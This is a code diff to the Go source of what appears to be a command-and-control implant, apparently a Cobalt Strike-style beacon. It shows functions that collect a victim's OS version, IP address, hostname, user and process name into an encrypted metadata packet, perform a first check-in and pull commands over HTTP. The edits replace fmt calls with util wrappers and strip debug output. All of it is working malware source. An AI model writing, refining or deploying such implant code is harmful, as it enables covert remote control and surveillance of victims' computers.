@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"encoding/binary"
-	"fmt"
 	"main/config"
 	"main/sysinfo"
 	"main/util"
@@ -207,21 +206,18 @@ func MakeMetaInfo() []byte {
 
 	// osInfoBytes
 	// ver,localIP,hostName,currentUser,processName
-	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%s", osVersion, localIP, hostName, currentUser, processName)
+	osInfo := util.Sprintf("%s\t%s\t%s\t%s\t%s", osVersion, localIP, hostName, currentUser, processName)
 
 	// insert port
 	osInfoBytes := make([]byte, len([]byte(osInfo))+1)
 	osInfoSlicne := []byte(osInfo)
 	osInfoBytes = append([]byte{metadataFlag}, osInfoSlicne...)
-
-	fmt.Printf("clientID: %d\n", clientID)
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, portBytes, osInfoBytes)
 
 	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
 	magicNum := sysinfo.GetMagicHead()
 	metaLen := WritePacketLen(metaInfo)
 	packetToEncrypt := util.BytesCombine(magicNum, metaLen, metaInfo)
-
 	return packetToEncrypt
 }
 
@@ -300,10 +296,10 @@ func MakeMetaInfo4plus() []byte {
 	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
 	binary.BigEndian.PutUint32(localIPBytes, localIP)
 
-	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	osInfo := util.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
 	osInfoBytes := []byte(osInfo)
 
-	fmt.Printf("clientID: %d\n", clientID)
+	util.Printf("clientID: %d\n", clientID)
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
 		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 
@@ -322,7 +318,7 @@ func FirstBlood() bool {
 		if err != nil {
 			time.Sleep(500 * time.Millisecond)
 		}
-		fmt.Println("firstblood: ok")
+		util.Println("firstblood: ok")
 		break
 	}
 	return true
@@ -331,7 +327,7 @@ func FirstBlood() bool {
 func PullCommand() ([]byte, error) {
 	resp, err := HttpGet(encryptedMetaInfo)
 	if err != nil {
-		fmt.Printf("pull command fail: %s\b", err)
+		util.Printf("pull command fail: %s\b", err)
 		return nil, err
 	}
 	return resp, nil
